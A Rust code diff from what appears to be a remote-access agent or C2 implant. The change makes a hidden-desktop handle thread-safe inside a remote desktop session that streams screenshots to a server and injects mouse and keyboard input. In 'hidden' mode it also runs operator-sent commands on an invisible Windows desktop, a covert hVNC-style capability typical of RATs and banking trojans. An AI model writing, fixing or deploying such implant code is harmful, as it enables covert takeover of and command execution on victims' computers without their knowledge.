@@ -8,6 +8,15 @@ use std::sync::atomic::{AtomicBool, Ordering};
 
 static RD_RUNNING: AtomicBool = AtomicBool::new(false);
 
+/// Wrapper to send HDESK across threads safely (we know it's valid for the process lifetime)
+#[cfg(target_os = "windows")]
+#[derive(Clone, Copy)]
+struct SendHDESK(winapi::shared::windef::HDESK);
+#[cfg(target_os = "windows")]
+unsafe impl Send for SendHDESK {}
+#[cfg(target_os = "windows")]
+unsafe impl Sync for SendHDESK {}
+
 pub fn start(task_id: i64, args: &serde_json::Value) -> TaskResult {
     if RD_RUNNING.load(Ordering::SeqCst) {
         return TaskResult::error(task_id, "remote desktop session already running".to_string());
@@ -24,8 +33,9 @@ pub fn start(task_id: i64, args: &serde_json::Value) -> TaskResult {
     RD_RUNNING.store(true, Ordering::SeqCst);
 
     let mode_clone = mode.clone();
+    let session_clone = session_id.clone();
     std::thread::spawn(move || {
-        run_session(&server_url, &session_id, &mode_clone);
+        run_session(&server_url, &session_clone, &mode_clone);
         RD_RUNNING.store(false, Ordering::SeqCst);
     });
 
@@ -59,7 +69,7 @@ fn run_session(server_url: &str, session_id: &str, mode: &str) {
 
     // Create hidden desktop if needed
     let desktop_handle = if mode == "hidden" {
-        create_hidden_desktop()
+        create_hidden_desktop().map(|h| SendHDESK(h))
     } else {
         None
     };
@@ -72,8 +82,8 @@ fn run_session(server_url: &str, session_id: &str, mode: &str) {
 
     let sender = std::thread::spawn(move || {
         while running_send.load(Ordering::SeqCst) && RD_RUNNING.load(Ordering::SeqCst) {
-            if let Some(frame_data) = capture_screen(desktop_handle) {
-                let (width, height) = get_screen_dimensions(desktop_handle);
+            if let Some(frame_data) = capture_screen(desktop_handle.map(|s| s.0)) {
+                let (width, height) = get_screen_dimensions(desktop_handle.map(|s| s.0));
                 let b64 = helpers::b64_encode(&frame_data);
                 let msg = serde_json::json!({
                     "type": "frame",
@@ -119,18 +129,18 @@ fn run_session(server_url: &str, session_id: &str, mode: &str) {
                                 let y = event["y"].as_i64().unwrap_or(0) as i32;
                                 let button = event["button"].as_str().unwrap_or("left");
                                 let action = event["action"].as_str().unwrap_or("click");
-                                inject_mouse(x, y, button, action, desktop_handle);
+                                inject_mouse(x, y, button, action, desktop_handle.map(|s| s.0));
                             }
                             Some("key") if mode_recv != "watch" => {
                                 let vk = event["vk"].as_u64().unwrap_or(0) as u16;
                                 let action = event["action"].as_str().unwrap_or("down");
-                                inject_key(vk, action, desktop_handle);
+                                inject_key(vk, action, desktop_handle.map(|s| s.0));
                             }
                             Some("run") if mode_recv == "hidden" => {
                                 let cmd = event["cmd"].as_str().unwrap_or("");
                                 if !cmd.is_empty() {
                                     if let Some(hd) = desktop_handle {
-                                        run_on_desktop(hd, cmd);
+                                        run_on_desktop(hd.0, cmd);
                                     }
                                 }
                             }
@@ -158,7 +168,7 @@ fn run_session(server_url: &str, session_id: &str, mode: &str) {
     // Cleanup hidden desktop
     if let Some(hd) = desktop_handle {
         unsafe {
-            winapi::um::winuser::CloseDesktop(hd);
+            winapi::um::winuser::CloseDesktop(hd.0);
         }
     }
 }
